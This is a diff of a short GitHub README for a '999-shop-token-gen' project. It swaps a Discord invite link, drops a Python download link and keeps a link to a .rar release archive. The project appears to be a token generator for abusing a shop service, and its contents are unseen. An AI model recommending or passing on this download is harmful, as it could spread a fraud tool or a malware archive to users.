@@ -1,20 +1,17 @@
 
 <h3 align="center">
-<a href="https://discord.gg/fornite">JOIN MY DISCORD SERVER</a>
+<a href="https://discord.gg/gui">JOIN THE DISCORD SERVER</a>
 </h3>
 
 <p align="center">
-<a href="https://github.com/celgz/999-shop-token-gen/releases/download/Release/999shop-token-gen.rar">PRESS TO DOWNLOAD</a>
- 
-<p align="center">
-<a href="https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe">DOWNLOAD PYTHON</a>ㅤㅤ 
+<a href="https://github.com/celgz/999-shop-token-gen/releases/download/Release/999shop-token-gen.rar">PRESS TO DOWNLOAD</a>ㅤㅤ 
  
 <p align="center">
 <a href="https://guns.lol/opsec">MY SOCIALS</a>
 
 </p>
 <h3 align="center">
-Star⭐ This Repo!
+Star ⭐ This Repo!
 </h3>
  
 ---
